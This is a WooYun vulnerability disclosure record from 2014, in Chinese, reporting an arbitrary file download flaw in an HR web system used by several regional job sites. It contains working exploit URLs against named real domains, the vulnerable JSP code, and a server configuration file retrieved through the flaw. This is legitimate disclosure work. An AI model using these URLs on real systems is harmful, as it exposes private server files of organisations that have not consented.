{"id": 55060, "wybug_id": "wooyun-2014-062275", "wybug_title": "某人力资源系统任意文件下载(多家人力资源网存在问题)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "风情万种", "wybug_date": "2014-05-30 10:31", "wybug_open_date": "2014-08-28 10:32", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向公众公开  简要描述： 某人力资源系统任意文件下载(多家人力资源网存在问题) 详细说明：  任意文件下载的链接http://www.lhjy.gov.cn/tabledownload/download.jsp?url=Dredboy5711%5Cweblh%5Cwebapp-lh%5Ctabledownload%5C&id=&filename=download.jsphttp://www.zjdeqing.lm.gov.cn/tabledownload/download.jsp?url=Dredboy5711%5Cdqwebnew%5Cwebapp-dq%5Ctabledownload%5C&id=&filename=download.jsphttp://www.lhrlzyw.com/tabledownload/download.jsp?url=Dredboy5711%5Cweblh%5Cwebapp-lh%5Ctabledownload%5C&id=&filename=download.jsphttp://www.dqlm.com/tabledownload/download.jsp?url=Dredboy5711%5Cdqwebnew%5Cwebapp-dq%5Ctabledownload%5C&id=&filename=download.jsphttp://www.fzjob.net:9090/tabledownload/download.jsp?url=Dredboy5711%5Cjxfzweb%5Ctabledownload%5C&id=&filename=download.jspdownload.jsp没有做任何的判断和过滤导致任意文件下载\n<%@ page contentType=\"text/html;charset=gb2312\" import=\"com.jspsmart.upload.*,java.io.File\" %><%// 新建一个SmartUpload对象SmartUpload su = new SmartUpload();// 初始化su.initialize(pageContext);// 设定contentDisposition为null以禁止浏览器自动打开文件，//保证点击链接后是下载文件。若不设定，则下载的文件扩展名为//doc时，浏览器将自动用word打开它。扩展名为pdf时，//浏览器将用acrobat打开。su.setContentDisposition(null);// 下载文件String url=request.getParameter(\"url\");\turl=url.replaceAll(\"redboy5711\",\":\");String id=request.getParameter(\"id\");String filename=request.getParameter(\"filename\");System.out.println(\"path11=========\"+filename);//filename=new String(filename.getBytes(\"ISO-8859-1\"),\"GB2312\");\t\tSystem.out.println(\"path222=========\"+filename);String path=url+id+File.separator+filename;su.downloadFile(path);%>\n我再下个web.xml试试http://www.fzjob.net:9090/tabledownload/download.jsp?url=Dredboy5711%5Cjxfzweb%5CWEB-INF%5C&id=&filename=web.xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE web-app  PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.2//EN\"  \"http://java.sun.com/j2ee/dtds/web-app_2_2.dtd\"><web-app>\t<display-name>TZSW WEB Application</display-name>      \t<session-config>\t\t<session-timeout>15</session-timeout>\t\t\t</session-config>\t\t\t<filter>\t\t<filter-name>EncodingFilter</filter-name>\t\t<filter-class>com.tzsw.plat.webcontroller.EncodingFilter</filter-class>\t</filter>\t<filter>\t    <filter-name>HeadFilter</filter-name>    \t<filter-class>com.tzsw.plat.webcontroller.HeadFilter</filter-class>\t</filter>\t<filter>    \t<filter-name>SaftyFilter</filter-name>\t    <filter-class>com.tzsw.plat.webcontroller.SaftyFilter</filter-class>\t</filter>\t \t\t<filter-mapping>\t\t<filter-name>EncodingFilter</filter-name>\t\t<url-pattern>*.jsp</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>EncodingFilter</filter-name>\t\t<url-pattern>*.do</url-pattern>\t</filter-mapping>\t\t<filter-mapping>    \t<filter-name>HeadFilter</filter-name>    \t<url-pattern>/MainServlet</url-pattern>\t</filter-mapping>\t\t<filter-mapping> \t   <filter-name>SaftyFilter</filter-name>  \t  <url-pattern>*.jsp</url-pattern>\t</filter-mapping>\t<filter-mapping> \t   <filter-name>SaftyFilter</filter-name>  \t  <url-pattern>*.do</url-pattern>\t</filter-mapping>\t<filter-mapping> \t   <filter-name>SaftyFilter</filter-name>  \t  <url-pattern>/MainServlet</url-pattern>\t</filter-mapping>\t<servlet>\t\t<servlet-name>MainServlet</servlet-name>\t\t<servlet-class>com.tzsw.plat.webcontroller.MainServlet</servlet-class>\t\t<init-param>\t\t\t<param-name>wl-dispatch-policy</param-name>\t\t\t<param-value>servletQueue</param-value>\t\t</init-param>\t\t<load-on-startup>1</load-on-startup>\t</servlet>\t\t<servlet>\t\t<servlet-name>ActionServlet</servlet-name>\t\t<servlet-class>org.apache.struts.action.ActionServlet</servlet-class>\t\t<init-param>\t\t\t<param-name>config</param-name>\t\t\t<param-value>/WEB-INF/struts-config.xml</param-value>\t\t</init-param>\t\t<load-on-startup>2</load-on-startup>\t</servlet>\t<servlet>\t\t<servlet-name>JMSListenerServlet</servlet-name>\t\t<servlet-class>com.tzsw.plat.webcontroller.LogMsgServlet</servlet-class>\t\t<load-on-startup>3</load-on-startup>\t</servlet>\t<servlet>\t\t<servlet-name>Connector</servlet-name>\t\t<servlet-class>com.fredck.FCKeditor.connector.ConnectorServlet</servlet-class>\t\t<init-param>\t\t\t<param-name>baseDir</param-name>\t\t\t<param-value>/UserFiles/</param-value>\t\t</init-param>\t\t<init-param>\t\t\t<param-name>debug</param-name>\t\t\t<param-value>true</param-value>\t\t</init-param>\t\t<load-on-startup>1</load-on-startup>\t</servlet>\t<servlet>\t\t<servlet-name>SimpleUploader</servlet-name>\t\t<servlet-class>com.fredck.FCKeditor.uploader.SimpleUploaderServlet</servlet-class>\t\t<init-param>\t\t\t<param-name>baseDir</param-name>\t\t\t<param-value>/UserFiles/</param-value>\t\t</init-param>\t\t<init-param>\t\t\t<param-name>debug</param-name>\t\t\t<param-value>true</param-value>\t\t</init-param>\t\t<init-param>\t\t\t<param-name>enabled</param-name>\t\t\t<param-value>true</param-value>\t\t</init-param>\t\t<init-param>\t\t\t<param-name>AllowedExtensionsFile</param-name>\t\t\t<param-value></param-value>\t\t</init-param>\t\t<init-param>\t\t\t<param-name>DeniedExtensionsFile</param-name>\t\t\t<param-value>php|php3|php5|phtml|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|dll|reg|cgi</param-value>\t\t</init-param>\t\t<init-param>\t\t\t<param-name>AllowedExtensionsImage</param-name>\t\t\t<param-value>jpg|gif|jpeg|png|bmp</param-value>\t\t</init-param>\t\t<init-param>\t\t\t<param-name>DeniedExtensionsImage</param-name>\t\t\t<param-value></param-value>\t\t</init-param>\t\t<init-param>\t\t\t<param-name>AllowedExtensionsFlash</param-name>\t\t\t<param-value>swf|fla</param-value>\t\t</init-param>\t\t<init-param>\t\t\t<param-name>DeniedExtensionsFlash</param-name>\t\t\t<param-value></param-value>\t\t</init-param>\t\t<load-on-startup>1</load-on-startup>\t</servlet>\t<servlet-mapping>\t\t<servlet-name>MainServlet</servlet-name>\t\t<url-pattern>/MainServlet</url-pattern>\t</servlet-mapping>\t<servlet-mapping>\t\t<servlet-name>ActionServlet</servlet-name>\t\t<url-pattern>*.do</url-pattern>\t</servlet-mapping>\t<servlet-mapping>\t\t<servlet-name>JMSListenerServlet</servlet-name>\t\t<url-pattern>/JMSListenerServlet</url-pattern>\t</servlet-mapping>  <servlet-mapping>    <servlet-name>Connector</servlet-name>    <url-pattern>/admin/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector</url-pattern>  </servlet-mapping>    <servlet-mapping>    <servlet-name>SimpleUploader</servlet-name>    <url-pattern>/admin/FCKeditor/editor/filemanager/upload/simpleuploader</url-pattern>  </servlet-mapping>  \t<welcome-file-list>\t\t<welcome-file>default.jsp</welcome-file>\t\t<welcome-file>login.jsp</welcome-file>\t</welcome-file-list> \t\t<!-- The default error page -->\t<error-page>\t\t<exception-type>java.lang.Exception</exception-type>\t\t<location>/Error.jsp</location>\t</error-page>   <taglib>    <taglib-uri>/FCKeditor</taglib-uri>    <taglib-location>/WEB-INF/FCKeditor.tld</taglib-location>  </taglib>\t <taglib>    <taglib-uri>/WEB-INF/struts-bean.tld</taglib-uri>    <taglib-location>/WEB-INF/struts-bean.tld</taglib-location>  </taglib>  <taglib>    <taglib-uri>/WEB-INF/struts-html.tld</taglib-uri>    <taglib-location>/WEB-INF/struts-html.tld</taglib-location>  </taglib>  <taglib>    <taglib-uri>/WEB-INF/struts-logic.tld</taglib-uri>    <taglib-location>/WEB-INF/struts-logic.tld</taglib-location>  </taglib>  <taglib>    <taglib-uri>/WEB-INF/struts-template.tld</taglib-uri>    <taglib-location>/WEB-INF/struts-template.tld</taglib-location>  </taglib>  <taglib>    <taglib-uri>/WEB-INF/struts-tiles.tld</taglib-uri>    <taglib-location>/WEB-INF/struts-tiles.tld</taglib-location>  </taglib>  <taglib>    <taglib-uri>/WEB-INF/struts-nested.tld</taglib-uri>    <taglib-location>/WEB-INF/struts-nested.tld</taglib-location>  </taglib>\t\t<resource-ref>         <res-ref-name>jdbc/webCoreDS</res-ref-name>         <res-type>javax.sql.DataSource</res-type>         <res-auth>Container</res-auth>\t</resource-ref></web-app>\n   漏洞证明：  \n\n   修复方案：  .......不解释   版权声明：转载请注明来源 风情万种@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-06-04 09:57 厂商回复： 根据测试结果，确认软件生产厂商为浙江天正思维信息技术有限公司。根据其公开的联系渠道，电话无人接听。按照测试用例，已经分别发给CNCERT江西和浙江分中心进行案例通报处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}